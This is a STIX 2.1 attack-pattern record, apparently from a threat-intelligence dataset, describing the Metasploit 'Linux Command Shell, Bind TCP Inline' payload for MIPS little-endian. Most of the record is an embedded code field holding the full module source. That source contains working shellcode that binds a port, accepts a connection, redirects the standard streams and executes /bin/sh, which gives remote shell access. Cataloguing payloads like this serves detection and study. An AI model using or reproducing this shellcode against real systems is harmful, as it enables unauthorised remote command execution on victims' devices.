{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b1c88db-80d1-4450-ab7a-2d00f96d2894",
    "created": "2024-08-14T16:33:19.443449Z",
    "modified": "2024-08-14T16:33:19.443453Z",
    "name": "Linux Command Shell, Bind TCP Inline",
    "description": "Listen for a connection and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/mipsle/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 232\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Bind TCP Inline',\n      'Description'   => 'Listen for a connection and spawn a command shell',\n      'Author'        =>\n        [\n          'scut',             # Original mips-irix-portshell shellcode\n          'vaicebine',        # Original shellcode mod\n          'Vlatko Kosturjak', # Metasploit module\n          'juan vazquez'      # Small fixes and optimizations\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_MIPSLE,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' => {} ,\n          'Payload' => ''\n        })\n    )\n  end\n\n  def generate(_opts = {})\n    if !datastore['LPORT']\n      return super\n    end\n\n    port = Integer(datastore['LPORT'])\n    port = [port].pack(\"n\").unpack(\"cc\");\n\n    shellcode =\n    \"\\xe0\\xff\\xbd\\x27\" + #     addiu   sp,sp,-32\n    \"\\xfd\\xff\\x0e\\x24\" + #     li      t6,-3\n    \"\\x27\\x20\\xc0\\x01\" + #     nor     a0,t6,zero\n    \"\\x27\\x28\\xc0\\x01\" + #     nor     a1,t6,zero\n    \"\\xff\\xff\\x06\\x28\" + #     slti    a2,zero,-1\n    \"\\x57\\x10\\x02\\x24\" + #     li      v0,4183 ( __NR_socket )\n    \"\\x0c\\x01\\x01\\x01\" + #     syscall\n\n    \"\\xff\\xff\\x50\\x30\" + #     andi    s0,v0,0xffff\n    \"\\xef\\xff\\x0e\\x24\" + #     li      t6,-17                        ; t6: 0xffffffef\n    \"\\x27\\x70\\xc0\\x01\" + #     nor     t6,t6,zero                    ; t6: 0x10 (16)\n    port.pack(\"C2\") + \"\\x0d\\x24\" +  #     li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 4444 (default LPORT))\n    \"\\x04\\x68\\xcd\\x01\" + #     sllv    t5,t5,t6                      ; t5: 0x5c110000\n    \"\\xfd\\xff\\x0e\\x24\" + #     li      t6,-3                         ; t6: -3\n    \"\\x27\\x70\\xc0\\x01\" + #     nor     t6,t6,zero                    ; t6: 0x2\n    \"\\x25\\x68\\xae\\x01\" + #     or      t5,t5,t6                      ; t5: 0x5c110002\n    \"\\xe0\\xff\\xad\\xaf\" + #     sw      t5,-32(sp)\n    \"\\xe4\\xff\\xa0\\xaf\" + #     sw      zero,-28(sp)\n    \"\\xe8\\xff\\xa0\\xaf\" + #     sw      zero,-24(sp)\n    \"\\xec\\xff\\xa0\\xaf\" + #     sw      zero,-20(sp)\n    \"\\x25\\x20\\x10\\x02\" + #     or      a0,s0,s0\n    \"\\xef\\xff\\x0e\\x24\" + #     li      t6,-17\n    \"\\x27\\x30\\xc0\\x01\" + #     nor     a2,t6,zero\n    \"\\xe0\\xff\\xa5\\x23\" + #     addi    a1,sp,-32\n    \"\\x49\\x10\\x02\\x24\" + #     li      v0,4169 ( __NR_bind )A\n    \"\\x0c\\x01\\x01\\x01\" + #     syscall\n\n    \"\\x25\\x20\\x10\\x02\" + #     or      a0,s0,s0\n    \"\\x01\\x01\\x05\\x24\" + #     li      a1,257\n    \"\\x4e\\x10\\x02\\x24\" + #     li      v0,4174 ( __NR_listen )\n    \"\\x0c\\x01\\x01\\x01\" + #     syscall\n\n    \"\\x25\\x20\\x10\\x02\" + #     or      a0,s0,s0\n    \"\\xff\\xff\\x05\\x28\" + #     slti    a1,zero,-1\n    \"\\xff\\xff\\x06\\x28\" + #     slti    a2,zero,-1\n    \"\\x48\\x10\\x02\\x24\" + #     li      v0,4168 ( __NR_accept )\n    \"\\x0c\\x01\\x01\\x01\" + #     syscall\n\n    \"\\xff\\xff\\xa2\\xaf\" + #     sw v0,-1(sp) # socket\n    \"\\xfd\\xff\\x11\\x24\" + #     li s1,-3\n    \"\\x27\\x88\\x20\\x02\" + #     nor s1,s1,zero\n    \"\\xff\\xff\\xa4\\x8f\" + #     lw a0,-1(sp)\n    \"\\x21\\x28\\x20\\x02\" + #     move a1,s1 # dup2_loop\n    \"\\xdf\\x0f\\x02\\x24\" + #     li v0,4063 ( __NR_dup2 )\n    \"\\x0c\\x01\\x01\\x01\" + #     syscall 0x40404\n    \"\\xff\\xff\\x10\\x24\" + #     li s0,-1\n    \"\\xff\\xff\\x31\\x22\" + #     addi s1,s1,-1\n    \"\\xfa\\xff\\x30\\x16\" + #     bne s1,s0 <dup2_loop>\n\n    \"\\xff\\xff\\x06\\x28\" + #     slti a2,zero,-1\n    \"\\x62\\x69\\x0f\\x3c\" + #     lui t7,0x2f2f \"bi\"\n    \"\\x2f\\x2f\\xef\\x35\" + #     ori t7,t7,0x6269 \"//\"\n    \"\\xec\\xff\\xaf\\xaf\" + #     sw t7,-20(sp)\n    \"\\x73\\x68\\x0e\\x3c\" + #     lui t6,0x6e2f \"sh\"\n    \"\\x6e\\x2f\\xce\\x35\" + #     ori t6,t6,0x7368 \"n/\"\n    \"\\xf0\\xff\\xae\\xaf\" + #     sw t6,-16(sp)\n    \"\\xf4\\xff\\xa0\\xaf\" + #     sw zero,-12(sp)\n    \"\\xec\\xff\\xa4\\x27\" + #     addiu a0,sp,-20\n    \"\\xf8\\xff\\xa4\\xaf\" + #     sw a0,-8(sp)\n    \"\\xfc\\xff\\xa0\\xaf\" + #     sw zero,-4(sp)\n    \"\\xf8\\xff\\xa5\\x27\" + #     addiu a1,sp,-8\n    \"\\xab\\x0f\\x02\\x24\" + #     li v0,4011 ( __NR_execve )\n    \"\\x0c\\x01\\x01\\x01\"   #     syscall 0x40404\n\n    return super + shellcode\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}